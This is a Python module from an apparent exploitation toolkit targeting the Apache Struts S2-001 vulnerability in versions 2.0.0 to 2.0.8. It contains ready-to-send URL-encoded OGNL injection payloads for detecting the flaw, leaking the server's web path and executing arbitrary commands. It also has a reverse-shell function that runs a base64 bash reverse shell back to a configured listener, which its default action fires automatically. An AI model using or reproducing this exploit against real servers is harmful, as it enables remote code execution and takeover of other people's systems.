# coding: utf-8
'''
Created on 2020年4月13日

@author: 10226475
'''
from poc.basepoc import BasePoc
from poc.utils.httpUtils import *
from poc.reverse_shell.base64_bash_reverse_shell import *
from poc.utils.cmdUtils import *
from urllib.parse import quote
from config.config import getConfigMessage
import random


class Struts001(BasePoc):
    info = "[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password; 支持获取WEB路径,任意命令执行和反弹shell"
    check_poc = "%25%7B{num1}%2B{num2}%7D"
    web_path = "%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath('%2F'))%2C%23response.flush()%2C%23response.close()%7D"
    exec_payload = "%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B{cmd}%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D"
    data = "username=test&password={exp}"
    
    def __init__(self, url, data=None, encoding="utf-8"):
        super(Struts001, self).__init__()
        self.function_dict = {"command_execute": self.exec_cmd,
                              "get_web_catalog": self.get_path,
                              "reverse_shell": self.reverse_shell}
        self.url = url
        if not data:
            self.data = "username=test&password={exp}"
        else:
            self.data = data
        self.encoding = encoding
        self.config_message = getConfigMessage()
        self.headers = self.config_message.headers
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'
        self.reverse_ip = self.config_message.reverse_ip
        self.reverse_port = self.config_message.reverse_port

    def getFunctionList(self) -> list:
        return sorted(self.function_dict.keys())
    
    def execFunction(self, function_name, *args, **kwargs) -> str:
        if function_name in self.function_dict:
            return self.function_dict[function_name](args, kwargs)
        raise RuntimeError("no function named {}".format(function_name))
    
    def getPocInfo(self) -> str:
        return self.info
    
    def sendRequest(self) -> str:
        self.log_helper.info("start check poc")
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        self.nn = str(num1 + num2)
        poc = self.check_poc.format(num1=num1, num2=num2)
        data = self.data.format(exp=poc)
        html = post(self.url, data, self.headers, self.encoding)
        return html
    
    def checkResult(self, res) -> str:
        if self.nn in res:
            return self.success_status
        else:
            return self.fail_status
    
    def sendDefaultPoc(self) -> str:
        self.reverse_shell(self.reverse_ip, self.reverse_port)
    
    def checkPoc(self) -> str:
        pass
    
    def get_path(self):
        """获取web目录"""
        data = self.data.format(exp=self.web_path)
        html = post(self.url, data, self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd: str):
        """
        .执行命令
        para:
            cmd:需要执行的linux命令
        """
        cmd = parse_cmd(cmd)
        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))
        html = post(self.url, data, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip: str, port: int, reserveFunction=base64_bash_reverse_shell):
        """
        .反弹shell
        para:
            ip:反弹shell接收ip
            port:反弹shell接收端口
            reserveFunction:反弹shell用的命令函数
        """
        shell = reserveFunction(self, ip, port)
        html = self.exec_cmd(shell)
        return html

